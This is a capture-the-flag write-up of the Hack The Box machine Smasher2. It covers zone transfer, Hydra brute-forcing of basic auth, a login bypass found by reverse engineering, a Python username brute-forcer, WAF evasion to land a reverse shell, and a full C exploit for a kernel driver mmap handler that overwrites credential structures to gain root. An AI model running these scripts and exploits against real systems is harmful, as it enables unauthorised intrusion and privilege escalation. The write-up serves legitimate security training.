---
layout: single
title: Smasher2 - Hack The Box
excerpt: "Just its predecessor, Smasher2 is a very difficult box with reverse engineering and binary exploitation. Unfortunately, the initial step required some insane brute-forcing which took part of the fun out of this one for me. I solved the authentication bypass part using an unintended method: The code compares the password against the username instead of the password in the configuration file so by guessing the username I also had the password and could log in. I had to do some WAF evasion to get my payload uploaded and land a shell. Then the final part of the box is exploiting a kernel driver mmap handler to change the credential structure in memory of my current user to get root access."
date: 2019-12-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-smasher2/smasher2_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - waf
  - sqli
  - bruteforce
  - kernel module
  - python
  - re
---

![](/assets/images/htb-writeup-smasher2/smasher2_logo.png)

Just its predecessor, Smasher2 is a very difficult box with reverse engineering and binary exploitation. Unfortunately, the initial step required some insane brute-forcing which took part of the fun out of this one for me. I solved the authentication bypass part using an unintended method: The code compares the password against the username instead of the password in the configuration file so by guessing the username I also had the password and could log in. I had to do some WAF evasion to get my payload uploaded and land a shell. Then the final part of the box is exploiting a kernel driver mmap handler to change the credential structure in memory of my current user to get root access.

Overcast was the first one to find the intended way to solve the authentication bypass. He posted an excellent writeup about it here and I recommend you check it out: [https://www.justinoblak.com/2019/10/01/hack-the-box-smasher2.html](https://www.justinoblak.com/2019/10/01/hack-the-box-smasher2.html)

## Summary

- We can do a zone transfer to find the `wonderfulsessionmanager.smasher2.htb` sub-domain.
- The domain has a simple generic website with a login form running on Python Flask.
- On the main website there's a `/backup` directory that is protected by HTTP basic authentication and contains the source code of the web application running on the machine
- The unintended way to bypass the authentication of the web app is to review the source code, run the `auth.py` with the shared library locally and identify that the supplied password is being checked against the username (instead of the password). Then it's just a matter of bruteforcing usernames until we find that we can log in with `Administrator / Administrator` and get an API key.
- Once we have an API key, we have to defeat a WAF to gain RCE on the system.
- After getting a shell, we find a custom kernel module that is vulnerable to memory mapping issues.
- Using the discovered vulnerability, we can modify the credentials memory structure of our user and change it so we have root privileges.

## Blogs used

- [Kernel Driver mmap Handler Exploitation](https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf)

## Portscan

```
# nmap -sC -sV -p- 10.10.10.135
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-04 23:23 EDT
Nmap scan report for smasher2.htb (10.10.10.135)
Host is up (0.023s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:fc:20:4e:5a (RSA)
|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)
|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)
53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80 website enumeration

The web server displays the default Ubuntu apache page:

![](/assets/images/htb-writeup-smasher2/apache.png)

When running gobuster I found an interesting `/backup` directory but it's protected by HTTP basic authentication.

```
# gobuster -w raft-large-words-lowercase.txt -t 25 -u http://10.10.10.135 -s 200,204,301,302,307,401
/backup (Status: 401)
```

![](/assets/images/htb-writeup-smasher2/backup1.png)

I tried a few different credentials but I wasn't able to get in.

## DNS zone transfer

In the portscan I saw that DNS was listening so I thought of doing a zone transfer to see if there are any sub-domains/vhosts. I found the `wonderfulsessionmanager.smasher2.htb` sub-domain by doing a zone transfer:

```
# host -t axfr smasher2.htb 10.10.10.135
Trying "smasher2.htb"
Using domain server:
Name: 10.10.10.135
Address: 10.10.10.135#53
Aliases: 

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 8130
;; flags: qr aa; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;smasher2.htb.			IN	AXFR

;; ANSWER SECTION:
smasher2.htb.		604800	IN	SOA	smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800
smasher2.htb.		604800	IN	NS	smasher2.htb.
smasher2.htb.		604800	IN	A	127.0.0.1
smasher2.htb.		604800	IN	AAAA	::1
smasher2.htb.		604800	IN	PTR	wonderfulsessionmanager.smasher2.htb.
smasher2.htb.		604800	IN	SOA	smasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800
```

## Enumerating wonderfulsessionmanager.smasher2.htb

On the `wonderfulsessionmanager.smasher2.htb` vhost I found a website for the DZONERZY Session Manager.

![](/assets/images/htb-writeup-smasher2/dsm1.png)

There's isn't much on the site except a login form at `/login`:

![](/assets/images/htb-writeup-smasher2/dsm2.png)

I tried a few random default credentials but I wasn't able to log in. As shown here, the login result comes in a JSON format:

![](/assets/images/htb-writeup-smasher2/dsm3.png)

Also, there is a `session` Cookie returned by the server:

`eyJpZCI6eyIgYiI6IllUUXhaVFk1WlRGbVpXVmhaVEF4WldRNU1HSTBZekUwTlRoaE5UVXlOalprT0RJNFpXUXdNZz09In19.XPcIkQ.R6SdddxAKkm8zMC-SPtaIlO-MGM`

That decodes to `{"id":{" b":"YTQxZTY5ZTFmZWVhZTAxZWQ5MGI0YzE0NThhNTUyNjZkODI4ZWQwMg=="}}` plus the signature. 

If we had the shared secret key we could probably craft our own arbitrary token but I don't see anything that would allow us to change privileges, unlike for example JWT tokens with an `admin=0` that we can change to `admin=1` after bruteforcing the shared secret.

## Bruteforcing the backup directory

After spending some time trying to find a vulnerability on the login page, I went back to the `/backup` folder I had found on the website with the IP address. I tried a few different wordlists without any luck. Since I didn't have the username, I had to guess it was either something generic like `admin` or any of the top usernames, or some combination of the 3 different names on the website: 

![](/assets/images/htb-writeup-smasher2/dsm4.png)

I built a wordlist with the following usernames:

```
admin
backup
dev
temp
backup
Ally
Sanders
Robert
Anderson
John
McAffrey
asanders
randerson
jmcaffrey
ally
sanders
robert
anderson
john
mcaffrey
andersonr
sandersa
mcaffreyj
john.mcaffrey
robert.anderson
ally.sanders
```

Unfortunately not of them worked. By that time, a lot of people in the Mattermost HTB chat were stuck in the same place and the box creator dropped a hint that we had to use **the full rockyou.txt** wordlist and start at the letter c. He also mentioned that the username was `admin`. I don't know how this part of the box got past the HTB testers since heavy bruteforcing is normally not allowed (I think the box later got patched and that basic auth part was removed). To put this into perspective, even when knowing the username and the start letter, we're looking at potentially ~640k passwords in rockyou.txt:

```
# egrep "^c.*" /usr/share/wordlists/rockyou.txt > wordlist.txt
root@ragingunicorn:~/htb/smasher2# wc -l wordlist.txt 
639676 wordlist.txt
```

In my opinion, this is way over the top since the full rockyou list has 14M+ entries and it's not possible to brute force an HTTP basic auth in a reasonable amount of time when we don't even know the username. Anyways, it still took me ~40 minutes to find the password when running 32 threads in hydra:

```
# hydra -l admin -P wordlist.txt 10.10.10.135 -t 32 http-get /backup
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-06-05 00:24:55
[DATA] max 32 tasks per 1 server, overall 32 tasks, 639677 login tries (l:1/p:639677), ~19990 tries per task
[DATA] attacking http-get://10.10.10.135:80/backup
[STATUS] 7725.00 tries/min, 7725 tries in 00:01h, 631952 to do in 01:22h, 32 active
[STATUS] 7830.67 tries/min, 23492 tries in 00:03h, 616185 to do in 01:19h, 32 active
[STATUS] 7795.57 tries/min, 54569 tries in 00:07h, 585108 to do in 01:16h, 32 active
[STATUS] 7838.53 tries/min, 117578 tries in 00:15h, 522099 to do in 01:07h, 32 active
[STATUS] 7856.03 tries/min, 243537 tries in 00:31h, 396140 to do in 00:51h, 32 active
[80][http-get] host: 10.10.10.135   login: admin   password: clarabibi
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-06-05 01:05:21
```

Password: `clarabibi`

I checked if that password was present in any other wordlist from SecLists, including the reduced rockyou list but I didn't find it there. It's only in the full rockyou list:

```
# grep -ri clarabibi /usr/share/seclists/
root@ragingunicorn:~# grep -ri clarabibi /usr/share/wordlists/rockyou.txt 
clarabibi
```

Ok, rant over.

Once I had the password, I checked out the `/backup` and found the source code for the authentication page on `wonderfulsessionmanager.smasher2.htb`

![](/assets/images/htb-writeup-smasher2/backup2.png)

## Bypassing the login prompt (unintended method)

The `auth.py` file is a Python Flask application that implements a few endpoints:

- `/login` presents the HTML page for logging in

![](/assets/images/htb-writeup-smasher2/code1.png)

- `/auth` handles the AJAX request from the login page

![](/assets/images/htb-writeup-smasher2/code2.png)

- `/assets` serves static content such as images

![](/assets/images/htb-writeup-smasher2/code3.png)

- `/api` clearly contains an RCE vector through the `subprocess` function, but it expects a key which is provided after logging in

![](/assets/images/htb-writeup-smasher2/code4.png)

Unfortunately, the username and password have been scrubbed from the source file backup:

![](/assets/images/htb-writeup-smasher2/code5.png)

The code also uses the custom `ses` module but it's implemented through the `ses.so` shared object library so I don't have an easy python source code to review.

```
# file ses.so
ses.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked,
BuildID[sha1]=0c67d40b77854318b10417b4aedfee95a52f0550, not stripped
```

To load the `ses.so` file in my Python code, I used the following `ses.py` snippet of code I found online:

```python
def __bootstrap__():
   global __bootstrap__, __loader__, __file__
   import sys, pkg_resources, imp
   __file__ = pkg_resources.resource_filename(__name__,'ses.so')
   __loader__ = None; del __bootstrap__, __loader__
   imp.load_dynamic(__name__,__file__)
__bootstrap__()
```

Then I used a skeleton code to load create a SessionManager object:

```python
import ses
import hashlib
import hmac
import base64

def craft_secure_token(content):
    h = hmac.new("HMACSecureKey123!", base64.b64encode(content).encode(), hashlib.sha256)
    return h.hexdigest()

login = ["snowscan", "yolo1234"]
s = ses.SessionManager(login, craft_secure_token(":".join(login)))
```

I experimented in the interactive interpreter a bit to list the different methods available for this object:

```
>>> s = ses.SessionManager(login, craft_secure_token(":".join(login)))
>>> dir(s)
['__doc__', '__init__', '__module__', 'blocked', 'check_login', 'inc_login_count', 'last_login',
 'login_count', 'rst_login_count', 'secret_key', 'time_module', 'user_login']
```

The `secret_key` property is created by the `craft_secure_token` function and it contains the API key that needs to be applied to access the `/api` endpoint:

In this case, the key is created by the HMAC of the login and password I put in my skeleton code:

```python
def craft_secure_token(content):
    h = hmac.new("HMACSecureKey123!", base64.b64encode(content).encode(), hashlib.sha256)
    return h.hexdigest()
...
Managers.update({id: ses.SessionManager(login, craft_secure_token(":".join(login)))})
```

```
>>> s.secret_key
'd781058ac21c2d30abc660e1c8d9c91e8f615ff1713a0d496b4153540be796d8'
```

There's a couple of method and properties to manage login count and lockout, but the most interesting method I checked after was `check_login`. Based on the `auth.py` source code, it expects a dictionnary with a `data` key that contains another dictionnary with both `username` and `password` as keys.

I tested the `check_login` function a few times but it always returned a False result even when I put the right credentials:

```
>>> login = ["snowscan", "yolo1234"]
>>> s = ses.SessionManager(login, craft_secure_token(":".join(login)))
>>> d = { 
...     "data": {
...         "username": "snowscan",
...         "password": "yolo1234"
...     }
... }
>>> 
>>> s.check_login(d)
[False, {'username': 'snowscan', 'password': 'yolo1234'}]
```

To see what is going on with the module, I started GDB after I launched by Python interactive interpreter and just attached to the Python PID:

```
# ps -ef | grep python
root      33226   2076  0 01:04 pts/1    00:00:00 python

# gdb -p 33226
GNU gdb (Debian 8.2.1-2) 8.2.1
```

I tried checking the functions with `info func` but since the program is already running, it shows all libc functions and others that are loaded. Way too much stuff displayed... My gdb skills suck so I used Ghidra to check the program functions:

![](/assets/images/htb-writeup-smasher2/ghidra1.png)

Only 4 functions shown for SessionManager:

- SessionManager_check_login
- SessionManager_init_login_count
- SessionManager_init
- SessionManager_rst_login_count

In `SessionManager_check_login`, I can see the code does two `strcmp` calls to check the username and password:

![](/assets/images/htb-writeup-smasher2/ghidra2.png)

I put a breakpoint in GDB at the `SessionManager_check_login` function call and traced its execution.

First, there's a `strcmp` for the username:

![](/assets/images/htb-writeup-smasher2/gdb.png)

Then on the next `strcmp` for the password there's something really strange...

![](/assets/images/htb-writeup-smasher2/gdb2.png)

It's comparing the supplied password against the username. Wow, that's a pretty bad bug! So if I just brute force the usernames and I find a valid one I will be able to login by using it as the password.

To brute force the username, I wrote the script below but had to factor in some error handling whenever I would get a 403 message for some usernames with invalid characters. Sometimes I would also get some false positive, plus the box also dies after ~300 login attempts so I had to reset quite a few times before I figured out the right wordlist.

```python
#!/usr/bin/python

import requests
import time

proxies = {
    "http": "http://127.0.0.1:8080"
}

url = "http://wonderfulsessionmanager.smasher2.htb/auth"

headers = {
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",

}

with open("userlist3.txt") as f:
    passwords = f.read().splitlines()

i = 0
bad = 0

while True:
    bad = 0
    s = requests.Session()
    r = s.get("http://wonderfulsessionmanager.smasher2.htb/login", proxies=proxies)
    if r.status_code != 200:
        print("GET FAILED!")
        exit(1)
    data = '{"action":"auth","data":{"username":"%s","password":"%s"}}' % (passwords[i], passwords[i])
    print("Testing username: %s" % passwords[i])
    while True:
        r = s.post(url, headers=headers, data=data, proxies=proxies)
        if r.status_code == 200:
            break
        if r.status_code == 403:
            bad = bad + 1
            if bad == 5:
                print("Skipping... %s" % passwords[i])
                break
    if (not "Cannot authenticate with data" in r.text) and (bad < 5):
        print("Potential password! %s" % passwords[i])
        with open("out.txt", "a") as f:
            f.write("%s\n" % passwords[i])
    i = i + 1
    time.sleep(0.05)
```

Eventually, I found that the username `Administrator` is the right one (case-sensitive):

```
# python brute.py 
Testing username: admin
Testing username: administrator
Testing username: operator
Testing username: sql
Testing username: demo
Testing username: pos
Testing username: user
Testing username: default
Testing username: defaultaccount
Testing username: account
Testing username: accounting
Testing username: guest
Testing username: guest
Testing username: adm
Testing username: office
Testing username: manager
Testing username: Admin
Testing username: Administrator
Potential password! Administrator
```

I can now log in and get an API key:

![](/assets/images/htb-writeup-smasher2/apikey.png)

## WAF evasion then RCE

Using the `/api/<key>/job` API, I can execute some commands like `whoami`:

![](/assets/images/htb-writeup-smasher2/rce1.png)

However there is a WAF configured because the following commands are blocked and the server returns a 403 Forbidden:

- most UNIX commands (ls, cat, etc.)
- multiple commands separated with a semi colon (ie. whoami;whoami)
- multiple commands separated with an ampersand (ie. whoami&&whoami)
- multiple commands separated by spaces
- and a bunch of others

Instead of using `ls`, I can do `echo *` or `echo ../../../../*` to use path traversal and walk the entire file system.

![](/assets/images/htb-writeup-smasher2/rce2.png)

I was able to find the home directory of user `dzonerzy`.

![](/assets/images/htb-writeup-smasher2/rce3.png)

To read the flag I used the `tac` command which was not blacklisted. It's basically the same as `cat` but lists the content of the file in reverse order.

![](/assets/images/htb-writeup-smasher2/rce4.png)

After some experimentation I found that the `printf` command is allowed and that hex encoded characters are permitted. We're also allowed to redirect the output to files so I now have a way to write arbitrary data to files without being intercepted by the WAF.

So I encoded the following shell script with CyberChef:

![](/assets/images/htb-writeup-smasher2/rce5.png)

Then I wrote the script to the server using `printf`:

![](/assets/images/htb-writeup-smasher2/rce6.png)

And made it executable...

![](/assets/images/htb-writeup-smasher2/rce7.png)

Then executed it and I finally got a shell

![](/assets/images/htb-writeup-smasher2/rce8.png)

```
# nc -lvnp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.135.
Ncat: Connection from 10.10.10.135:51882.
id
uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
python -c 'import pty;pty.spawn("/bin/bash")'
dzonerzy@smasher2:~/smanager$
```

After getting a shell, I dropped my RSA public key into `authorized_keys` so I could use a regular SSH session:

```
dzonerzy@smasher2:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQ
ABAAABAQC+SZ75RsfVTQxRRbezIJn+bQgNifXvjMWfhT1hJzl/GbTbykF
...
tGPTwuiA5NAcPKPG25jkQln3J8Id2ngappH2jeDg89 root@ragingunicorn" > .ssh/authorized_keys
```

```
# ssh dzonerzy@10.10.10.135
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * 'snap info' now shows the freshness of each channel.
   Try 'snap info microk8s' for all the latest goodness.

Last login: Fri Feb 15 22:05:15 2019
dzonerzy@smasher2:~$ id
uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

## Root privesc

After searching for a while I found a custom kernel module here:

- `./modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko`

This is clearly the target since the box creator's name is the module info:

```
$ modinfo ./modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko
filename:       /lib/./modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko
version:        1.0
description:    LKM for dzonerzy dhid devices
author:         DZONERZY
license:        GPL
srcversion:     974D0512693168483CADFE9
depends:        
retpoline:      Y
name:           dhid
vermagic:       4.15.0-45-generic SMP mod_unload
```

We can see that the module has already been loaded:

```
dzonerzy@smasher2:/lib$ lsmod | grep dhid
dhid                   16384  0
dzonerzy@smasher2:/lib$ dmesg | grep dhid
[   10.110988] dhid: loading out-of-tree module taints kernel.
[   10.111020] dhid: module verification failed: signature and/or required key missing - tainting kernel

dzonerzy@smasher2:/lib$ ls -l /dev/dhid
crwxrwxrwx 1 root root 243, 0 Jun  6 01:09 /dev/dhid
```

I am not very familiar with the way Linux kernel modules work so I had to google a bit. I noticed that there is `dev_read` function but no `dev_write` function, so it's unlikely we have to do some kind of buffer overflow.

![](/assets/images/htb-writeup-smasher2/kernel1.png)


The `dev_read` function seems to return only a simple string, it doesn't do anything else.

![](/assets/images/htb-writeup-smasher2/kernel2.png)

To test this, I used the program below that just opens a file description on the `dhid` device and read from it.

```c
#include<stdio.h>
#include<stdlib.h>
#include<errno.h>
#include<fcntl.h>
#include<string.h>
#include<unistd.h>
 
#define BUFFER_LENGTH 256 // The buffer length (crude but fine)
static char receive[BUFFER_LENGTH]; // The receive buffer from the LKM
 
int main() {
    int ret, fd;
    fd = open("/dev/dhid", O_RDWR); // Open the device with read/write access
    if (fd < 0){
        perror("Failed to open the device...");
        return errno;
    }

    ret = read(fd, receive, BUFFER_LENGTH); // Read the response from the LKM
    if (ret < 0){
        perror("Failed to read the message from the device.");
        return errno;
    }

    printf("The received message is: [%s]\n", receive);
    printf("End of the program\n");
    return 0;
}
```

As expected, it returns the string and simply exits:

```
dzonerzy@smasher2:/dev/shm$ gcc -o test test.c
dzonerzy@smasher2:/dev/shm$ ./test
The received message is: [This is the right way, please exploit this shit!]
End of the program
```

There's an interesting paper from MWR Lab about [Kernel Driver mmap Handler Exploitation](https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf) that apply to the custom kernel module here.

The gist of it is if the mmap handler in the module doesn't perform proper validation of parameters then we can map all the physical memory of the system from a program then read/write kernel memory from user space. This allows an attacker to read sensitive data and/or change credential structures. In this case, I want to change the privileges of the `dzonerzy` user to become root.

The decompiled code for `dev_mmap` right next to the whitepaper code example:

![](/assets/images/htb-writeup-smasher2/kernel3.png)

The whitepaper contains an exploit code that search the memory space for credential structures then modify it to give root access.

```c
#include<stdio.h>
#include<stdlib.h>
#include<errno.h>
#include <sys/mman.h>
#include<fcntl.h>
#include<string.h>
#include<unistd.h>
#include <pthread.h>

int main(int argc, char * const * argv)
{
	printf("[+] PID: %d\n", getpid());
	int fd = open("/dev/dhid", O_RDWR);
	if (fd < 0)
	{
		printf("[-] Open failed!\n");
		return -1;
	}
	printf("[+] Open OK fd: %d\n", fd);
	unsigned long size = 0xf0000000;
	unsigned long mmapStart = 0x42424000;
	unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);
	if (addr == MAP_FAILED)
	{
		perror("Failed to mmap: ");
		close(fd);
		return -1;
	}
	printf("[+] mmap OK addr: %lx\n", addr);
	
	unsigned int uid = getuid();
	printf("[+] UID: %d\n", uid);
	unsigned int credIt = 0;
	unsigned int credNum = 0;
	while (((unsigned long)addr) < (mmapStart + size - 0x40))
	{
		credIt = 0;
		if (
		addr[credIt++] == uid &&
		addr[credIt++] == uid &&
		addr[credIt++] == uid &&
		addr[credIt++] == uid &&
		addr[credIt++] == uid &&
		addr[credIt++] == uid &&
		addr[credIt++] == uid &&
		addr[credIt++] == uid
		)
		{
			credNum++;
			printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);
			credIt = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			addr[credIt++] = 0;
			if (getuid() == 0)
			{
				puts("[+] GOT ROOT!");
				credIt += 1; //Skip 4 bytes, to get capabilities
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				addr[credIt++] = 0xffffffff;
				execl("/bin/sh", "-", (char *)NULL);
				puts("[-] Execl failed...");
				break;
			}
			else
			{
				credIt = 0;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
				addr[credIt++] = uid;
			}
		}
		addr++;
	}
	puts("[+] Scanning loop END");
	fflush(stdout);
	
	int stop = getchar();
	return 0;
}
```

After compiling and running the code, we get root access:

```
dzonerzy@smasher2:/dev/shm$ gcc -w -o exploit exploit.c
dzonerzy@smasher2:/dev/shm$ ./exploit
[+] PID: 15475
[+] Open OK fd: 3
[+] mmap OK addr: 42424000
[+] UID: 1000
[+] Found cred structure! ptr: 0x763600c4, credNum: 1
[+] Found cred structure! ptr: 0x76360544, credNum: 2
[+] Found cred structure! ptr: 0x76360cc4, credNum: 3
[+] Found cred structure! ptr: 0x76361444, credNum: 4
[+] Found cred structure! ptr: 0x76361b04, credNum: 5
[+] Found cred structure! ptr: 0x76361bc4, credNum: 6
[+] Found cred structure! ptr: 0x76361e04, credNum: 7
[+] Found cred structure! ptr: 0x76c4af04, credNum: 8
[+] GOT ROOT!
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(dzonerzy)

# cat /root/root.txt
7791e0...
```